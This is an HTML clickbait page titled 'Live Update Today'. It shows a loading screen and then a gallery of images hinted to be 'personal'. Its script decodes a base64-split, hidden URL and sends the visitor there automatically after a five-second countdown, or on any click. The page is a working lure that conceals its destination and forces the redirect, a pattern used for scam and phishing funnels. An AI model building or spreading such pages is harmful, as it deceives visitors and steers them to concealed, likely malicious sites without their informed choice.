<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- OG META -->
<meta property="og:title" content="🔴 Live Update Today">
<meta property="og:description" content="Watch the latest update happening right now ▶️ Click to view.">
<meta property="og:image" content="https://i.imgur.com/9AS1uEY.jpeg">
<meta property="og:type" content="website">

<title>🔴 Live Update Today</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0f0f0f;
  color:white;
}

/* LOADING */
#loading{
  position:fixed;
  width:100%;
  height:100%;
  background:#0f0f0f;
  display:flex;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  z-index:999;
}

.loader{
  width:45px;
  height:45px;
  border:5px solid #333;
  border-top:5px solid #00ffcc;
  border-radius:50%;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  100%{transform:rotate(360deg);}
}

/* ENTER */
#enterScreen{
  display:none;
  height:100vh;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  text-align:center;
}

/* GALLERY */
#galleryPage{
  display:none;
  text-align:center;
}

.gallery{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:8px;
  padding:10px;
}

.gallery img{
  width:100%;
  border-radius:8px;
  cursor:pointer;
  transition:0.2s;
}

.gallery img:hover{
  transform:scale(1.05);
}

button{
  margin-top:20px;
  padding:12px 20px;
  background:#00ffcc;
  border:none;
  border-radius:8px;
  font-weight:bold;
  cursor:pointer;
}

.note{
  font-size:13px;
  opacity:0.7;
  margin-top:10px;
}
</style>
</head>

<body>

<!-- LOADING -->
<div id="loading">
  <div class="loader"></div>
  <p style="opacity:0.6;">Loading content...</p>
</div>

<!-- ENTER -->
<div id="enterScreen">
  <h2>LIVE UPDATE TODAY</h2>
  <p style="opacity:0.7;">Tap below or wait a moment…</p>
  <button onclick="enterPage()">Enter</button>
</div>

<!-- GALLERY -->
<div id="galleryPage">

  <h2>Exclusive Collection</h2>

  <p style="opacity:0.75; max-width:320px; margin:auto;">
  A small collection that’s been getting attention lately.
  Some moments are a little more… personal than others.
  </p>

  <div class="gallery">
    <img src="https://i.imgur.com/cT072eg.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/wVCBBj2.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/j6qaYFd.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/xX61mRI.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/knjOdH3.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/LRypO0v.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/TBRyf55.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/5OlrEm2.jpeg" onclick="goLink()">
    <img src="https://i.imgur.com/0poFxSi.jpeg" onclick="goLink()">
  </div>

  <button onclick="goLink()">Open Full Access</button>

  <p class="note">
    You will be redirected in <span id="count">5</span>s...
  </p>

</div>

<script>

/* STEP 1: loading → enter */
setTimeout(()=>{
  document.getElementById("loading").style.display="none";
  document.getElementById("enterScreen").style.display="flex";

  setTimeout(()=>{
    enterPage();
  },2000);

},1200);

/* STEP 2: enter */
function enterPage(){
  document.getElementById("enterScreen").style.display="none";
  document.getElementById("galleryPage").style.display="block";
  startCountdown();
}

/* ENCODED LINK */
const p1="aHR0cHM6Ly9mZGVk";
const p2="ZGcuaHVic3Mub25l";
const p3="L3AvbmhWTnk=";

function goLink(){
  const url = atob(p1+p2+p3);
  window.location.href = url;
}

/* COUNTDOWN */
function startCountdown(){
  let t=5;
  const el=document.getElementById("count");

  const timer=setInterval(()=>{
    t--;
    el.textContent=t;

    if(t<=0){
      clearInterval(timer);
      goLink();
    }
  },1000);
}

</script>

</body>
</html>
